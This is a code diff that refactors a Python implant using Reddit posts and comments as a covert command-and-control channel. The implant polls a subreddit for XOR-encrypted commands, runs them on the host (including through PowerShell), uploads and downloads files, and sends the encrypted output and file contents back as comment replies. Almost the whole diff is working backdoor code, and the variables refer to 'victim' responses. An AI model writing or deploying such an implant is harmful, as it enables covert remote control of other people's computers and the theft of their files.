@@ -1,8 +1,5 @@
 import praw
-import string
 import time
-import os
-import json
 import subprocess
 import base64
 
@@ -54,62 +51,97 @@ def decrypt(encoded_text, key):
     decoded_text = base64_decode(encoded_text)
     return xor_decrypt(decoded_text, key)
 
-#read a post with a specific title
-def readTask(username, password, subreddit_name, listenerID):
-    victim_responses = []
-  
-    subreddit = reddit.subreddit(subreddit_name)
-    resp = subreddit.search(listenerID, limit=None)
 
-    for submission in resp:        
-        #look only for comments which has our command in it
-        submission.comments.replace_more(limit=None)
-        for top_level_comment in submission.comments:
-            if("in:" in top_level_comment.body):
-                victim_responses.append(top_level_comment.body)
-        
-    #use recursion when no new reply is found
-    if not victim_responses:
-        print("[!] No task received, waiting for 5 seconds")
-        time.sleep(5)
-        return readTask(username, password, subreddit_name, listenerID)
-        
-    #there is a task in the array, return it
-    else:
+class Implant:
+    
+    def __init__(self, client_id, client_secret, username, password, subreddit_name, listener_name, user_agent, xor_key):
+        self.client_id = client_id
+        self.client_secret = client_secret
+        self.username = username
+        self.password = password
+        self.subreddit_name = subreddit_name
+        self.listener_name = listener_name
+        self.user_agent = user_agent
+        self.xor_key = xor_key
+        self.listener_id = None
+        self.submission = None
+        self.comment_id = None
+        self.processed_comments = []
+        self.__reddit = None
+        self.__subreddit = None
+    
+    @property
+    # creating an authorized reddit instance
+    def reddit(self):
+        if self.__reddit is None:
+            self.__reddit = praw.Reddit(
+                client_id = self.client_id,
+                client_secret = self.client_secret,
+                username = self.username,
+                password = self.password,
+                user_agent = self.user_agent
+                )
+            self.__reddit.validate_on_submit = True
+        return self.__reddit
+    
+    @property
+    def subreddit(self):
+        if self.__subreddit is None:
+            self.__subreddit = self.reddit.subreddit(self.subreddit_name)
+        return self.__subreddit
+    
+    def verifySession(self):
+        for submission in self.subreddit.top(time_filter='all'):
+            if(submission.title == self.listener_name):
+                self.submission = submission
+        return self.submission
+
+    #read a post with a specific title
+    def readTask(self):
+        victim_responses = []
+
+        while not victim_responses:
+            #look only for comments which has our command in it
+            self.verifySession()
+            self.submission.comments.replace_more(limit=None)
+            for top_level_comment in self.submission.comments:
+                if("in:" in top_level_comment.body and top_level_comment.id not in self.processed_comments):
+                    self.comment_id = top_level_comment.id
+                    self.processed_comments.append(top_level_comment.id)
+                    victim_responses.append(top_level_comment.body)
+            
         response = victim_responses[0]
         response = response[6:-1]
+        victim_responses.clear()
         
-        #decryot the message
+        #decrypt the message
         ciphertext = decrypt(str(response), xor_key)
             
-        if("powershell" in ciphertext):
-           ciphertext = "powershell.exe " + ciphertext[11:]
-         
-        elif("run" in ciphertext):
+        if "powershell" in ciphertext:
+            ciphertext = "powershell.exe " + ciphertext[11:]
+        elif "run" in ciphertext:
             ciphertext = ciphertext[4:]
             
         print("[+] Received task to execute: " + ciphertext)
         return ciphertext
 
-def sendOutput(command, output, username, password, subreddit_name, listenerID):
-    subreddit = reddit.subreddit(subreddit_name)
-    resp = subreddit.search(listenerID, limit=None)
-    
-    #encrypt the output which is about to be sent as a reply
-    ciphertext = encrypt(output, xor_key)
-    
-    for submission in resp:
-        submission.comments.replace_more(limit=None)
-        for top_level_comment in submission.comments:
-            if("in:" in top_level_comment.body):
-                top_level_comment.reply("out: " + str(ciphertext))
-                time.sleep(2)
-                #edit the reply to executed (done in teamserver)
-                #top_level_comment.edit("executed")
+    def sendOutput(self, output,):
+        #encrypt the output which is about to be sent as a reply
+        ciphertext = encrypt(output, self.xor_key)
+
+        comment = self.reddit.comment(self.comment_id)
+        comment_body = comment.body
+        new_comment_body = comment_body.replace('in', 'executed')
+        comment.edit(new_comment_body)
+        comment.reply("out: " + str(ciphertext))
+        print('[*] Task output sent.')
+        time.sleep(5)
+
     
 def runTask(command):
     output = subprocess.getoutput(command)
     return output
+
 
 if __name__ == "__main__":
     #fill in the data with your credentials
@@ -119,36 +151,38 @@ if __name__ == "__main__":
     username = "myusername"
     password = "mypassword"
     subreddit = "mysubreddit"
-    listenerID = "listener_number"
+    listener_name = "listener_name"
     xor_key = "myxorkey"
     #-------------------------------------
     user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36"
 
-    # creating an authorized reddit instance
-    reddit = praw.Reddit(client_id = client_id,
-                     client_secret = client_secret,
-                     username = username,
-                     password = password,
-                     user_agent = user_agent)
-                     
-    reddit.validate_on_submit = True
+    i = Implant(client_id, client_secret, username, password, subreddit, listener_name, user_agent, xor_key)
+    listener_session = i.verifySession()
+    if listener_session:
+        print("[+] Entered the session")
+    else:
+        print("[!] Listener session not found")
 
     while True:
         time.sleep(5)
-        command = readTask(username, password, subreddit, listenerID)
+        command = i.readTask()
+        if command == 'exit':
+            print('[*] Exiting...')
+            i.sendOutput('Implant terminated.')
+            exit()
         
         if(command[:8] == "download"):
             filename = command[9:] #save filename
             output = encode_file_in_base64(filename)
             if(len(output) > 10000):
-                sendOutput(command, "[!] File is too large (" + str(len(output)) + "/10000 available characters)", username, password, subreddit, listenerID)
+                i.sendOutput("[!] File is too large (" + str(len(output)) + "/10000 available characters)")
             else:
-                sendOutput(command, output, username, password, subreddit, listenerID)
+                i.sendOutput(output)
         
         elif(command[:6] == "upload"):
             base64_to_file(command.split()[2], command.split()[1])
-            sendOutput(command, "[+] File uploaded successfully", username, password, subreddit, listenerID)
+            i.sendOutput("[+] File uploaded successfully")
         
         else:
             output = runTask(command)
-            sendOutput(command, output, username, password, subreddit, listenerID)
+            i.sendOutput(output)
